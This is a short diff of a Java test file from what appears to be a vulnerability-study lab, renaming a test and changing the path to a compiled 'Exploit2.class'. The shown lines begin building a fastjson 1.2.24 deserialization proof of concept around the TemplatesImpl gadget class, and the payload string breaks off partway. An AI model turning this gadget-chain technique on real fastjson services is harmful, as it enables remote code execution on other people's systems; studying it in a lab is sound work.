@@ -53,8 +53,8 @@ public class test1 {
     }
 
     @Test
-    public void test_poc_2() {
-        String evilClassPath = "/Users/zhangzhaochao/work/vuln-study/vulhubWork/JavaVul/fastjson-1.2.24/target/classes/com/myapp/Exploit2.class";
+    public void test_poc_21() {
+        String evilClassPath = "/Users/zhangzhaochao/work/vulhubWork/vulhub_study/JavaVul/fastjson-1.2.24/target/classes/com/myapp/Exploit2.class";
         String evilCode = readClass(evilClassPath);
         String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
         String fj_poc = "{\"@type\":\"" + NASTY_CLASS +
